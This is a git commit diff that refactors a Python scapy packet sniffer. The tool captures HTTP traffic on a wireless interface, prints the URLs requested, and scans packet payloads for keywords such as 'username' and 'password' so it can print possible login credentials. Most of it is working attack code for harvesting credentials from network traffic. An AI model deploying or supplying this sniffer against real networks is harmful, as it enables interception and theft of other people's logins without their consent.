0f3acf1504e86748547b5426f9f2655b9f724e76
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-03-04 20:02:34 +0530

    Refactoring code

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,23 +1,34 @@
-#!usr/bin/env/python
+#!/usr/bin/env python
 
 import scapy.all as scapy
 from scapy.layers import http
+# from scapy_http import *
 
-def snif(interface):
-    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+def snif(interfce):
+    scapy.sniff(iface=interfce, store=False, prn=process_sniffed_packet)
 
+def get_url(packet):
+    return  packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_logininfo(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "uname", "login", "password", "pass", "passwrd"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        url = packet[http.HTTPRequest.Host + http.HTTPRequest.Path]
-        print(url)
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ["username" , "user", "uname" , "password", "pass"]
-            for keyword in keywords:
-                if keyword in load:
-                    print(load)
-                    break
+        url = get_url(packet)
+        print("[+] HTTP Request >>" + url)
+
+        loginInfo = get_logininfo(packet)
+        if loginInfo:
+            print("\n\n[+] Possible Username/Password > " + loginInfo + "\n\n")
+
+
 
 
 snif("wlan0")
+
